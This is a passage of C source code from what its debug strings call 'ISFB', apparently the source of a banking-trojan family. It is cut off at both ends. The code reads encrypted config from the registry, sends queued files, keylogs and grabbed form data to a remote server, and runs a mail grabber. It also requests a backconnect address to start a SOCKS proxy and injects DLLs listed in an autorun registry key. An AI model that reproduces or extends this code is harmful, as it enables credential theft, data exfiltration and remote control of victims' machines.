	cData = pBuffer;
	eData = cData + Size;

	do 
	{
		for (i=0; i<6; i++)
		{
			s[i] = cData + sizeof(ULONG);
			if (s[i] > eData)
			{
				Ret = FALSE;
				break;
			}
			l[i] = *(ULONG*)cData;
			cData = s[i]+l[i];
		}

		if (cData > eData)
			Ret = FALSE;

		if (l[0] <= 1)
			break;

	} while(Ret);

	return(Ret);
}


//
//	Loads config data from the registry, and tries to validate the data by calling ProcessPackedConfig().
//
static VOID LoadConfig(VOID)
{
	WINERROR Status;
	PCHAR	pBuffer;
	ULONG	Size;

	// Reloading client ID
	Status = RegReadValue(szDataRegClientId, &pBuffer, &Size);

	if (Status == NO_ERROR)
	{
		if (Size == sizeof(CRM_CLIENT_ID))
		{
#ifdef _USE_BUILDER
			// Saving group ID previously loaded from the INI-file.
			ULONG	GroupId = g_ClientId.GroupId;
#endif
			memcpy(&g_ClientId, pBuffer, sizeof(CRM_CLIENT_ID));
#ifdef _USE_BUILDER
			if (g_ClientId.GroupId == 0)
				// Restoring group ID loaded from the INI-file
				g_ClientId.GroupId = GroupId;
#endif
			if (g_ClientId.GroupId == 0)
				g_ClientId.GroupId = g_Version;
		}
		hFree(pBuffer);
	}

	// Loading and parsing config data
	if ((Status = RegReadValue(szDataRegDataValue, &pBuffer, &Size)) == NO_ERROR)
	{
		if (!ProcessPackedConfig(pBuffer, Size))
			Status = ERROR_INVALID_PARAMETER;

		hFree(pBuffer);
	}

	if (Status != NO_ERROR)
	{
		DbgPrint("ISFB_%04x: Config loading failed, status %u.\n", g_CurrentProcessId, Status);
	}

#ifdef _URL_BLOCK_COMMAND

	// Loading blocked URL data
	if ((Status = RegReadValue(szDataRegBlockValue, &pBuffer, &Size)) == NO_ERROR)
	{
		if (VerifyConfig(pBuffer, Size))
		{
			PCHAR pOldBlockedData;

			ConfigLockExclusive(&g_ConfigData);

			pOldBlockedData = g_ConfigData.BlockedUrlData;
			g_ConfigData.BlockedUrlData = pBuffer;
			g_ConfigData.BlockedUrlSize = Size;

			ConfigUnlockExclusive(&g_ConfigData);

			if (pOldBlockedData)
				hFree(pOldBlockedData);
		}
		else
		{
			DbgPrint("ISFB_%04x: Blocked URL list verification failed.\n", g_CurrentProcessId);
			hFree(pBuffer);
		}
	}	// if ((Status = RegReadValue(szDataRegBlockValue, pBuffer, &Size)) == NO_ERROR)
#endif	//	_URL_BLOCK_COMMAND
}


#ifdef _ENABLE_BACKCONNECT
//
//	Sends request to the active host to obtain a backconnect port.
//
BOOL BcSendRequest(VOID)
{
	BOOL	Ret = FALSE;
	PCHAR	Buffer;
	ULONG	Size;
	WINERROR Status;

	if ((Status = ConfRequestData(g_BcURL, 0, FALSE, NULL, 0, &Buffer, &Size)) == NO_ERROR)
	{
		PBC_REPLY	pBcReply = (PBC_REPLY)Buffer;
		SOCKADDR_IN	Addr = {0};

		DbgPrint("ISFB_%04x: BC request successed, %u bytes returned\n", g_CurrentProcessId, Size);

		if (Size == sizeof(BC_REPLY))
		{
			DbgPrint("ISFB_%04x: BC server address received: %u.%u.%u.%u:%u\n", g_CurrentProcessId, HIBYTE(HIWORD(pBcReply->Address)), LOBYTE(HIWORD(pBcReply->Address)), HIBYTE(LOWORD(pBcReply->Address)), LOBYTE(LOWORD(pBcReply->Address)), pBcReply->Port);

			switch(pBcReply->Type)
			{
			case BC_TYPE_SOCKS:
				// Address of a BC-port received, starting SOCKS server
				Addr.sin_family = AF_INET;
				Addr.sin_addr.S_un.S_addr = htonL(pBcReply->Address);
				Addr.sin_port = htonS(pBcReply->Port);
				PipeSendCommand(CMD_SOCKS_START, (PCHAR)&Addr, sizeof(SOCKADDR_IN), NULL);
				break;
			case BC_TYPE_VNC:
				break;
			default:
				break;
			}	// switch(pBcReply->Type)
		}	// if (Size == sizeof(BC_REPLY))

		Ret = TRUE;
		hFree(Buffer);
	}	// if ((Status = ConfRequestData(g_BcURL, 0, FALSE, NULL, 0, &Buffer, &Size)) == NO_ERROR)

	return(Ret);
}

#endif


//
//	Creates waitable timer with the specified name, type and default security attributes.
//	Initializes the timer to 1 millisecond interval.
//	Returns handle for the newly created timer or, in case of an error, NULL.
//
HANDLE CreateInitTimer(
	LPTSTR	TimerName,		// name for the new timer object
	BOOL	bNotification	// TRUE to create a notification timer, FALSE for a synchronization one
	)
{
	HANDLE	hTimer;
	
	if (hTimer = CreateWaitableTimer(&g_DefaultSA, bNotification, TimerName))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			// If the timer was just created, setting it to one second interval
			LARGE_INTEGER DueTime;
			DueTime.QuadPart = _RELATIVE(_SECONDS(1));
			SetWaitableTimer(hTimer, &DueTime, 0, NULL, NULL, FALSE);
		}
	}	// if (hTimer = CreateWaitableTimer(&g_DefaultSA, TRUE, TimerName))

	return(hTimer);
}


//
//	Creates global objects commonly used by browsers and the shell.
//	Since global objects have to exist even when all browsers are closed this function shuld be called from the shell process.
//
WINERROR CreateGlobalObjects()
{
	
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	HANDLE		hTimer;

	do	// not a loop
	{
		if (!(hTimer = CreateInitTimer(g_ConfigUpdateTimerName, TRUE)))
			break;

		if (!(hTimer = CreateInitTimer(g_CommandTimerName, FALSE)))
			break;
#ifndef _SEND_FORMS
		if (!(hTimer = CreateInitTimer(g_SendTimerName, FALSE)))
			break;
#endif

		Status = NO_ERROR;
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}


//
//	Enumerates all values of the speciifed registry key.
//	For each value calls the specified callback function with the specified Context parameter.
//
WINERROR ConfWalkRegistryValues(
	LPTSTR	pKeyName,
	CONF_WALK_REGISTRY_CALLBACK	pCallback,
	PVOID	Context
	)

{
	ULONG	Index = 0, DataSize = 0, NameSize = 0, PathSize, Type;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	HKEY	hKey;
	LPTSTR	pName;
	PCHAR	pData;

	if ((Status = RegOpenKey(HKEY_CURRENT_USER, pKeyName, &hKey)) == NO_ERROR)
	{
		Status = ERROR_NOT_ENOUGH_MEMORY;

		if (pName = hAlloc((MAX_PATH + 1) * sizeof(_TCHAR)))
		{
			PathSize = (MAX_PATH + 1) * sizeof(_TCHAR);

			if (pData = hAlloc(PathSize))
			{
				do
				{
					NameSize = (MAX_PATH + 1) * sizeof(_TCHAR);
					DataSize = PathSize;

					Status = RegEnumValue(hKey, Index, pName, &NameSize, 0, &Type, pData, &DataSize);

					if (Status == ERROR_MORE_DATA)
					{
						if (NameSize > (MAX_PATH + 1) * sizeof(_TCHAR))
						{
							// Invalid parameter name, taking the next one
							Index += 1;
							continue;
						}

						if (DataSize > PathSize)
						{
							// Buffer is too small to receive the path value
							hFree(pData);
							if (!(pData = hAlloc(PathSize = DataSize)))
							{
								Status = ERROR_NOT_ENOUGH_MEMORY;
								break;
							}
							continue;
						}
					}	// if (Status == ERROR_MORE_DATA)

					if (Status == NO_ERROR)
					{
						// Decrypting file path
						XorDecryptBuffer(pData, DataSize, g_MachineRandSeed, FALSE);

						Status = (pCallback)(hKey, pName, pData, DataSize, &Index, Context);
					}	// if (Status == NO_ERROR)
				} while(Status == NO_ERROR && (WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT));

				if (Status == ERROR_NO_MORE_ITEMS)
					// All files are enumerated and sent
					Status = NO_ERROR;

				hFree(pData);
			}	// if (pData = hAlloc(PathSize))
			hFree(pName);
		}	// if (pName = hAlloc((sizeof(TEMP_NAME)*2 + 1) * sizeof(_TCHAR)))
		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_FilesRegistryKey, &hKey)) == NO_ERROR)

	return(Status);
}



//
//	Queries FILES engine for a file sections queued for send. Sends queued file sections if any.
//
WINERROR EnumAndSendFiles_old(VOID)
{
	HANDLE	hSec;
	ULONG	Index = 0, DataSize = 0, NameSize = 0, PathSize, Size, Type;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	HKEY	hKey;
	LPTSTR	pName;
	LPWSTR	pFilePath;
	PCHAR	Map;

	if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_FilesRegistryKey, &hKey)) == NO_ERROR)
	{
		Status = ERROR_NOT_ENOUGH_MEMORY;

		if (pName = hAlloc((sizeof(TEMP_NAME) * 2 + 1) * sizeof(_TCHAR)))
		{
			PathSize = (MAX_PATH + 1) * sizeof(_TCHAR);

			if (pFilePath = hAlloc(PathSize))
			{
				do
				{
					NameSize = (sizeof(TEMP_NAME) * 2 + 1) * sizeof(_TCHAR);
					DataSize = PathSize;

					Status = RegEnumValue(hKey, Index, pName, &NameSize, 0, &Type, (BYTE*)pFilePath, &DataSize);

					if (Status == ERROR_MORE_DATA)
					{
						if (NameSize > (sizeof(TEMP_NAME) * 2 + 1) * sizeof(_TCHAR))
						{
							// Invalid parameter name, taking the next one
							Index += 1;
							continue;
						}

						if (DataSize > PathSize)
						{
							// Buffer is too small to receive the path value
							hFree(pFilePath);
							if (!(pFilePath = hAlloc(PathSize = DataSize)))
								break;
							continue;
						}
					}	// if (Status == ERROR_MORE_DATA)

					if (Status == NO_ERROR)
					{
						// Decrypting file path
						XorDecryptBuffer((PCHAR)pFilePath, DataSize, g_MachineRandSeed, FALSE);

						if (!FilesQueryFileSection(pFilePath, &hSec, &Size))
						{
							Index += 1;
							continue;
						}

						if (Map = MapViewOfFile(hSec, FILE_MAP_READ, 0, 0, Size))
						{
							LPTSTR pFileName = (LPTSTR)pFilePath;

							HexStrToBuffer(pName + NameSize - 2, (PCHAR)&Type);
							if (Type == 0)
								Type = SEND_ID_FILE;
#ifndef _UNICODE
							wcstombs(pFileName, pFilePath, lstrlenW(pFilePath) + 1);
#endif
							pFileName = PathFindFileName(pFileName);
							
							if ((Status = ConfSendData(Map, Size, Type, pFileName, TRUE)) == NO_ERROR)
								RegDeleteValue(hKey, pName);

							UnmapViewOfFile(Map);
						}	// if (Map = MapViewOfFile(hSec, FILE_MAP_READ, 0, 0, Size))
					}	// if (Status == NO_ERROR)
				} while(Status == NO_ERROR && (WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT));

				if (Status == ERROR_NO_MORE_ITEMS)
					// All files are enumerated and sent
					Status = NO_ERROR;

				hFree(pFilePath);
			}	// if (pFilePath = hAlloc(PathSize))
			hFree(pName);
		}	// if (pName = hAlloc((sizeof(TEMP_NAME)*2 + 1) * sizeof(_TCHAR)))
		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_FilesRegistryKey, &hKey)) == NO_ERROR)

	return(Status);
}



WINERROR SendFilesCallback(
	HKEY	hKey,
	LPTSTR	pKeyName, 
	PCHAR	pKeyData,
	ULONG	Size,
	PULONG	pIndex,
	PVOID	Context
	)
{
	PCHAR	pMap;
	HANDLE	hSec;
	ULONG	FileSize, Type = 0;
	LPWSTR	pFilePath = (LPWSTR)pKeyData;
	WINERROR Status = NO_ERROR;

	if (Size > sizeof(WCHAR))
	{
		pFilePath[Size / sizeof(WCHAR) - 1] = 0;

		DbgPrint("ISFB_%04x: Sending file: \"%S\"\n", g_CurrentProcessId, pFilePath);

		if (FilesQueryFileSection(pFilePath, &hSec, &FileSize))
		{
			if (pMap = MapViewOfFile(hSec, FILE_MAP_READ, 0, 0, FileSize))
			{
				LPTSTR pFileName = (LPTSTR)pFilePath;

				HexStrToBuffer(pKeyName + lstrlen(pKeyName) - 2, (PCHAR)&Type);
				if (Type == 0)
					Type = SEND_ID_FILE;
#ifndef _UNICODE
				wcstombs(pFileName, pFilePath, lstrlenW(pFilePath) + 1);
#endif
				pFileName = PathFindFileName(pFileName);
				
				if ((Status = ConfSendData(pMap, FileSize, Type, pFileName, TRUE)) == NO_ERROR)
					RegDeleteValue(hKey, pKeyName);

				UnmapViewOfFile(pMap);
			}	// if (Map = MapViewOfFile(hSec, FILE_MAP_READ, 0, 0, Size))
			else
			{
				DbgPrint("ISFB_%04x: MapViewOfFile failed\n", g_CurrentProcessId);
				*pIndex += 1;
			}

			CloseHandle(hSec);
		}	// if (FilesQueryFileSection(pFilePath, &hSec, &FileSize))
		else
		{
			DbgPrint("ISFB_%04x: FilesQueryFileSection failed\n", g_CurrentProcessId);
			*pIndex += 1;
		}

		DbgPrint("ISFB_%04x: Send status %u\n", g_CurrentProcessId, Status);
	}	// if (Size > sizeof(WCHAR))
	else
		*pIndex += 1;

	UNREFERENCED_PARAMETER(Context);

	return(Status);
}


//
//	Queries FILES engine for a file sections queued for send. Sends queued file sections if any.
//
WINERROR EnumAndSendFiles(VOID)
{
	WINERROR Status;

	Status = ConfWalkRegistryValues(g_FilesRegistryKey, &SendFilesCallback, NULL);

	return(Status);
}

#ifdef _LOAD_REG_DLL

WINERROR ConfAutorunCallback(
	HKEY	hKey, 
	LPTSTR	pKeyName, 
	PCHAR	pKeyData, 
	ULONG	Size,
	PULONG	pIndex,
	PLIST_ENTRY	pAutoRunList
	)
{
	WINERROR Status = NO_ERROR;
	PRUN_ENTRY	pRunEntry;
	ULONG	NameLen = lstrlen(pKeyName);

	if (Size > sizeof(_TCHAR))
	{
		pKeyData[Size / sizeof(_TCHAR) - 1] = 0;

		if (pRunEntry = hAlloc(sizeof(RUN_ENTRY) + Size + (NameLen + 1) * sizeof(_TCHAR)))
		{
			InitializeListHead(&pRunEntry->Entry);
			pRunEntry->pName = (PCHAR)pRunEntry + sizeof(RUN_ENTRY);
			pRunEntry->pValue = (PCHAR)(pRunEntry->pName + NameLen + 1);
			pRunEntry->Size = Size;

			lstrcpy(pRunEntry->pName, pKeyName);
			memcpy(pRunEntry->pValue, pKeyData, Size);

			InsertTailList(pAutoRunList, &pRunEntry->Entry);
		}	 // if (pRunEntry = hAlloc(sizeof(RUN_ENTRY) + Size + (NameLen + 1) * sizeof(_TCHAR)))
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
	}	// if (Size > sizeof(_TCHAR))

	*pIndex += 1;

	UNREFERENCED_PARAMETER(hKey);

	return(Status);
}

VOID ConfProcessAutoRun(VOID)
{
	LIST_ENTRY	AutoRunList;
	PLIST_ENTRY	pEntry, pNext;
	PRUN_ENTRY	pRunEntry, pRunEntry1, pRunEntryArch = NULL;
	LPTSTR	pNameArch;
	WINERROR Status = NO_ERROR;
	HMODULE	hModule;

	InitializeListHead(&AutoRunList);
	ConfWalkRegistryValues(g_RunRegistryKey, &ConfAutorunCallback, &AutoRunList);

	while((pEntry = AutoRunList.Flink) != &AutoRunList)
	{
		pRunEntry = CONTAINING_RECORD(pEntry, RUN_ENTRY, Entry);
		pNext = pEntry->Flink;
		RemoveEntryList(&pRunEntry->Entry);
	
#ifndef _M_AMD64
		if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
#endif
		{
			if (pNameArch = PsSupNameChangeArch(pRunEntry->pName))
			{
				// Looking for a similar run entry for an other architecture
				while (pNext != &AutoRunList)
				{
					pRunEntryArch = CONTAINING_RECORD(pNext, RUN_ENTRY, Entry);
					pNext = pNext->Flink;

					if (!lstrcmp(pRunEntryArch->pName, pNameArch))
					{
						RemoveEntryList(&pRunEntryArch->Entry);
						break;
					}
					else
						pRunEntryArch = NULL;
				}	// while (pNext != &AutoRunList)

				hFree(pNameArch);
			}	// if (pNameArch = PsSupNameChangeArch(pRunEntry->pName))
		}	// if (g_CurrentProcessFlags & GF_WOW64_PROCESS)

		if ((pRunEntryArch) && !StrStr(pRunEntryArch->pName, sz64))
		{
			// pRunEntry has to contain 32-bit DLL information and pRunEntryArch 46-bit
			pRunEntry1 = pRunEntry;
			pRunEntry = pRunEntryArch;
			pRunEntryArch = pRunEntry1;
		}	// if ((pRunEntryArch) &&...

		{
#if _INJECT_AS_IMAGE
		// Starting DLLs without saving them to a disk
			PROCESS_INFORMATION	ProcInfo;
			AD_CONTEXT	AdCtx = {0};

			if (pRunEntryArch)
			{
				if ((Status = FilesLoadFile(pRunEntryArch->pValue, (PCHAR*)&AdCtx.pModule64, &AdCtx.Module64Size)) == NO_ERROR)
					XorDecryptBuffer((PCHAR)AdCtx.pModule64, AdCtx.Module64Size, g_MachineRandSeed, FALSE);

				if ((Status = FilesLoadFile(pRunEntry->pValue, (PCHAR*)&AdCtx.pModule32, &AdCtx.Module32Size)) == NO_ERROR)
					XorDecryptBuffer((PCHAR)AdCtx.pModule32, AdCtx.Module32Size, g_MachineRandSeed, FALSE);
			}	// if (pRunEntryArch)
			else
			{
#ifdef _M_AMD64
				if ((Status = FilesLoadFile(pRunEntry->pValue, (PCHAR*)&AdCtx.pModule64, &AdCtx.Module64Size)) == NO_ERROR)
					XorDecryptBuffer((PCHAR)AdCtx.pModule64, AdCtx.Module64Size, g_MachineRandSeed, FALSE);
#else
				if ((Status = FilesLoadFile(pRunEntry->pValue, (PCHAR*)&AdCtx.pModule32, &AdCtx.Module32Size)) == NO_ERROR)
					XorDecryptBuffer((PCHAR)AdCtx.pModule32, AdCtx.Module32Size, g_MachineRandSeed, FALSE);
#endif
			}	// else	// if (pRunEntryArch)

			
			if (Status == NO_ERROR)
			{
				ProcInfo.dwProcessId = g_CurrentProcessId;
				ProcInfo.dwThreadId = GetCurrentThreadId();
				ProcInfo.hProcess = GetCurrentProcess();
				ProcInfo.hThread = GetCurrentThread();

				Status = AdInjectImage(&ProcInfo, &AdCtx, 0, &hModule);
			}
			else
				CmdUnregDll(pRunEntry->pName);

			if (AdCtx.pModule32)
				hFree((PCHAR)AdCtx.pModule32);
			if (AdCtx.pModule64)
				hFree((PCHAR)AdCtx.pModule64);

#else	// _INJECT_AS_IMAGE
			LPTSTR	pDllPath = pRunEntry->pValue;

	 #ifdef _M_AMD64
			if (pRunEntryArch)
				pDllPath = pRunEntryArch->pValue;
	 #endif
			DbgPrint("ISFB_%04x: Loading DLL: \"%s\"\n", g_CurrentProcessId, pDllPath);
			LogWrite("Loading DLL: \"%s\"", pDllPath);

			if (!(hModule = LoadLibrary(pDllPath)))
				Status = GetLastError();
#endif	//	else // _INJECT_AS_IMAGE
		}

		DbgPrint("ISFB_%04x: DLL load status: %u\n", g_CurrentProcessId, Status);
		LogWrite("DLL load status: %u", Status);

		if (pRunEntryArch)
			hFree(pRunEntryArch);
		hFree(pRunEntry);
	}	// while((pEntry = AutoRunList.Flink) != &AutoRunList)

	ASSERT(IsListEmpty(&AutoRunList));
}

#endif	// _LOAD_REG_DLL

WINERROR SendAllPendingData(VOID)
{
#ifdef _ENABLE_KEYLOG
	if (g_ClientId.Plugins & PG_BIT_KEYLOG)
 #ifdef _SEND_FORMS
		// Sending keylog data
		GetAndSendData(CMD_GET_KEYLOG, SEND_ID_KEYLOG, LOG_SIZE_MAX, NULL, szKeyLog);
 #else
		// Saving keylog data into a file
		PipeSendCommand(CMD_STORE_KEYLOG, NULL, 0, NULL);
 #endif
#endif	//	_ENABLE_KEYLOG

#ifndef _SEND_FORMS
	// Packing collected forms, grabs and screenshots
	PipeSendCommand(CMD_PACK_FORMS, NULL, 0, NULL);
	// For previouse operation to complete
	WaitForSingleObject(g_AppShutdownEvent, 10000);
#endif
	// Sending all files 
	return(EnumAndSendFiles());
}


#define	SHUTDOWN_EVENT_ID	0
#define	REG_EVENT_ID		1
#define	CONFIG_TIMER_ID		2
#define	TASK_TIMER_ID		3
#define	SEND_TIMER_ID		4
#define	BC_TIMER_ID			5
//
//	Thread routine. 
//	Waits for the config and task update timers, then attempts to acquire the config (or task) update mutex and 
//	 update the config, or receive a task file.
//	Spins in a loop until g_AppShutdownEvent is signaled or any error occured.
//
WINERROR WINAPI MainRequestThread(
	PVOID Context	// user-defined thread context value
	)
{
	HANDLE Objects[6];
	HANDLE hConfigMutex = 0, hTaskMutex = 0, hBcMutex = 0, hSendMutex = 0;
	HANDLE hStoreTimer = 0, hConfigTimer = 0, hTaskTimer = 0, hBcTimer = 0, hSendTimer = 0; 
	HANDLE hRegEvent = 0;
	WINERROR Status = ERROR_INVALID_PARAMETER;
	ULONG	NumberWaitObjects;
	HKEY	hKey;
	LARGE_INTEGER	DueTime;

	ENTER_WORKER();

	DbgPrint("ISFB_%04x: MainRequestThread() started with ID 0x%x.\n", g_CurrentProcessId, GetCurrentThreadId());

	if (g_HostProcess != HOST_EX)
		// Load existing config if any
		LoadConfig();

	ConfSelectHost(UCHAR_MAX);

	do	// not a loop
	{
		Objects[SHUTDOWN_EVENT_ID] = g_AppShutdownEvent;

		// Create timers and mutexes, so they should exist even if the browser was closed
		if (!(hTaskTimer = CreateInitTimer(g_CommandTimerName, TRUE)))
			break;

		if (!(hTaskMutex = CreateMutex(&g_DefaultSA, FALSE, g_CommandMutexName)))
			break;

		if (g_HostProcess != HOST_EX)
		{
			// Browser-specific initialization 

			if (!(hConfigTimer = CreateInitTimer(g_ConfigUpdateTimerName, TRUE)))
				break;

			if (!(hConfigMutex = CreateMutex(&g_DefaultSA, FALSE, g_ConfigUpdateMutexName)))
				break;
#ifndef _SEND_FORMS
			if (!(hSendTimer = CreateInitTimer(g_SendTimerName, TRUE)))
				break;

			if (!(hSendMutex = CreateMutex(&g_DefaultSA, FALSE, g_SendMutexName)))
				break;
#endif	// !_SEND_FORMS
	
#ifdef _ENABLE_BACKCONNECT
			if (!(hBcTimer = CreateInitTimer(g_BcTimerName, TRUE)))
				break;

			if (!(hBcMutex = CreateMutex(&g_DefaultSA, FALSE, g_BcMutexName)))
				break;
#endif
	
			ASSERT(g_ActiveEvent);
			Objects[1] = g_ActiveEvent;

			// Waiting for Parser to activate
			Status = WaitForMultipleObjects(2, Objects, FALSE, INFINITE);

			if (Status != (WAIT_OBJECT_0 + 1))
				// g_AppShutdownEvent fired or an error occured
				break;
		}	// if (g_HostProcess != HOST_EX)
		else
		{
			if (!(hStoreTimer = CreateInitTimer(NULL, TRUE)))
				break;

#ifdef _GRAB_MAIL
			if (!(g_ClientId.Plugins & PG_BIT_MAIL))
			{
				// Activating mail grabber for a once
				PipeSendCommand(CMD_GET_MAIL, NULL, 0, NULL);
				SetGroupId(g_ClientId.GroupId, NULL, (g_ClientId.Plugins | PG_BIT_MAIL), g_ClientId.HostIndex);
			}
#endif

#ifdef _LOAD_REG_DLL
			ConfProcessAutoRun();
#endif
		}
		
		// Creating registry change notification event
		if (!(hRegEvent = CreateEvent(NULL, FALSE, FALSE, NULL)))
			break;

		// Open program main registry key
		if (RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) != NO_ERROR)
			break;

		DbgPrint("ISFB_%04x: MainRequestThread is active.\n", g_CurrentProcessId);

#ifdef _SEND_FORMS
		if (g_HostProcess != HOST_EX)
			SendAllPendingData();
#endif
		do // main loop
		{
			// Waiting for the config update timer, task update timer and the config change event
			Objects[REG_EVENT_ID] = hRegEvent;
			Objects[TASK_TIMER_ID] = hTaskTimer;

			if (g_HostProcess != HOST_EX)
			{
				Objects[CONFIG_TIMER_ID] = hConfigTimer;
				Objects[SEND_TIMER_ID] = hSendTimer;
#ifdef _ENABLE_BACKCONNECT
				NumberWaitObjects = 5;
				Objects[BC_TIMER_ID] = hBcTimer;
#else
				NumberWaitObjects = 4;
#endif
#ifndef _SEND_FORMS
				NumberWaitObjects += 1;
#endif
				// Check out the existing config
				LoadConfig();
			}	// if (g_HostProcess != HOST_EX)
			else
			{
				Objects[CONFIG_TIMER_ID] = hStoreTimer;

#ifdef _TASK_FROM_EXPLORER
				if (g_ClientId.Plugins & PG_BIT_KNOCKER)
					NumberWaitObjects = 4;
				else
#endif
					NumberWaitObjects = 3;
			}

			// Starting registry change notification
			RegNotifyChangeKeyValue(hKey, TRUE, REG_NOTIFY_CHANGE_LAST_SET, hRegEvent, TRUE);

			// Waiting for any event or timer
			Status = WaitForMultipleObjects(NumberWaitObjects, Objects, FALSE, INFINITE);

			if (Status == WAIT_FAILED || (Status == (WAIT_OBJECT_0 + SHUTDOWN_EVENT_ID)))
			{
				// Wait failed or g_AppShutdownEvent signaled
				DbgPrint("ISFB_%04x: Wait for timers failed.\n", g_CurrentProcessId);
				break;
			}

			if (Status == (WAIT_OBJECT_0 + REG_EVENT_ID))
			{
				// Reloading client ID since it could be changed
				GetClientId();
				continue;
			}

			if (Status == (WAIT_OBJECT_0 + CONFIG_TIMER_ID))
			{
				// Config update timer is ready
				if (g_HostProcess != HOST_EX)
				{
					// Trying to acquire the update mutex
					Status = WaitForSingleObject(hConfigMutex, 0);

					if (Status == WAIT_FAILED)
					{
						// Wait failed
						DbgPrint("ISFB_%04x: Wait for config mutex failed.\n", g_CurrentProcessId);
						break;
					}

					if (Status != WAIT_TIMEOUT)
					{
						// We hold the mutex, updating the config
						CRC32	ConfigCRC = GetConfigCRC();

						ASSERT(Status == WAIT_OBJECT_0);

						// Since our thread can be terminated while loading a config we have to set the timer here
						DueTime.QuadPart = _RELATIVE(_SECONDS(g_ConfigTimeout));
						SetWaitableTimer(hConfigTimer, &DueTime, 0, NULL, NULL, FALSE);
		
						if (!UpdateConfig(ConfigCRC) && (ConfigCRC == 0))
						{
							// Config was not updated successfully, waiting for ConfigFailTimeout seconds to try again
							DueTime.QuadPart = _RELATIVE(_SECONDS(min(g_ConfigTimeout, g_ConfigFailTimeout)));
							SetWaitableTimer(hConfigTimer, &DueTime, 0, NULL, NULL, FALSE);
						}
					}
					else
					{
						// The mutex acquired by someone else. Now wait for it to release 
						//  and then we'll reload the config from the registry.
						Objects[1] = hConfigMutex;
						Status = WaitForMultipleObjects(2, Objects, FALSE, INFINITE);
						if (Status == WAIT_FAILED || Status == WAIT_OBJECT_0)
						{
							// Wait failed or g_AppShutdownEvent signaled
							DbgPrint("ISFB_%04x: Wait for config mutex to reload failed.\n", g_CurrentProcessId);
							break;
						}
						ASSERT(Status == (WAIT_OBJECT_0 + 1) || Status == (WAIT_ABANDONED_0 + 1));
					}
					ReleaseMutex(hConfigMutex);
				}	// if (g_HostProcess != HOST_EX)
				else
				{
					// There's a StoreTimer fired within the explorer
					DueTime.QuadPart = _RELATIVE(_SECONDS(StoreDataTime));
					SetWaitableTimer(hStoreTimer, &DueTime, 0, NULL, NULL, FALSE);
#ifdef _ENABLE_KEYLOG
					if (g_ClientId.Plugins & PG_BIT_KEYLOG)
					// Saving keylog data into a file
						CmdGetKeylog(NULL);
#endif	// _ENABLE_KEYLOG
				}
			}	// if (Status == WAIT_OBJECT_0 + CONFIG_TIMER_ID)
			else if (Status == (WAIT_OBJECT_0 + TASK_TIMER_ID))
			{
				// Task update timer is ready
				// Trying to acquire the task mutex
				Status = WaitForSingleObject(hTaskMutex, 0);

				if (Status == WAIT_FAILED)
				{
					DbgPrint("ISFB_%04x: Wait for task mutex failed.\n", g_CurrentProcessId);
					break;
				}

				if (Status != WAIT_TIMEOUT)
				{
					// We holding the mutex, checking for a command
					ASSERT(Status == WAIT_OBJECT_0);
			
					if (g_ClientId.Plugins & PG_BIT_KNOCKER)
						DueTime.QuadPart = _RELATIVE(_SECONDS(g_KnockerTimeout));
					else
						DueTime.QuadPart = _RELATIVE(_SECONDS(g_TaskTimeout));
					SetWaitableTimer(hTaskTimer, &DueTime, 0, NULL, NULL, FALSE);

					SwitchToThread();
					ReleaseMutex(hTaskMutex);
				
					// Receiving and processing commands
					ReceiveCommmand();

#ifndef _SEND_FORMS
					if (g_HostProcess == HOST_EX)
#endif
						SendAllPendingData();

				}	// if (Status != WAIT_TIMEOUT)
			}	// else if (Status == (WAIT_OBJECT_0 + TASK_TIMER_ID))
#ifndef _SEND_FORMS
			else if (Status == (WAIT_OBJECT_0 + SEND_TIMER_ID))
			{
				// Send update timer is ready
				// Trying to send collected form data
				Status = WaitForSingleObject(hSendMutex, 0);

				if (Status == WAIT_FAILED)
				{
					DbgPrint("ISFB_%04x: Wait for send mutex failed.\n", g_CurrentProcessId);
					break;
				}

				if (Status != WAIT_TIMEOUT)
				{
					// We holding the mutex
					ASSERT(Status == WAIT_OBJECT_0);

					DueTime.QuadPart = _RELATIVE(_SECONDS(g_SendTimeout));
					SetWaitableTimer(hSendTimer, &DueTime, 0, NULL, NULL, FALSE);

					SwitchToThread();
					ReleaseMutex(hSendMutex);
					
					// Packing and seending all collected data
					DbgPrint("ISFB_%04x: Packing and sending collected form data\n", g_CurrentProcessId);
					SendAllPendingData();
				}	// if (Status != WAIT_TIMEOUT)
			}	// else if (Status == (WAIT_OBJECT_0 + SEND_TIMER_ID))
#endif	// !_SEND_FORMS
#ifdef _ENABLE_BACKCONNECT
			else 
			{
				// BC timer is ready
				ASSERT(Status == (WAIT_OBJECT_0 + BC_TIMER_ID));

				// Trying to acquire the bc mutex
				Objects[1] = hBcMutex;
				Status = WaitForMultipleObjects(2, Objects, FALSE, 0);

				if (Status == WAIT_FAILED || Status == WAIT_OBJECT_0)
				{
					DbgPrint("ISFB_%04x: Wait for BC mutex failed.\n", g_CurrentProcessId);
					break;
				}

				if (Status != WAIT_TIMEOUT)
				{
					// We holding the mutex, making a BC request
					ASSERT(Status == (WAIT_OBJECT_0 + 1) || Status == (WAIT_ABANDONED_0 + 1));

					if (g_ClientId.Plugins & BIT_SOCKS)
						BcSendRequest();

					ReleaseMutex(hBcMutex);
				}	// if (Status != WAIT_TIMEOUT)

				DueTime.QuadPart = _RELATIVE(_SECONDS(g_BcTimeout));
				SetWaitableTimer(hBcTimer, &DueTime, 0, NULL, NULL, FALSE);
			}
#endif
			else
			{
				ASSERT(FALSE);
			}
		} while(TRUE);

		if (Status == WAIT_FAILED)
		{
			DbgPrint("ISFB_%04x: Wait failed, status: %u\n", g_CurrentProcessId, GetLastError());
		}
	} while (FALSE);


	// Cleaning up
#ifdef _ENABLE_BACKCONNECT
	if (hBcTimer)
		CloseHandle(hBcTimer);
	if (hBcMutex)
		CloseHandle(hBcMutex);
#endif
	if (hStoreTimer)
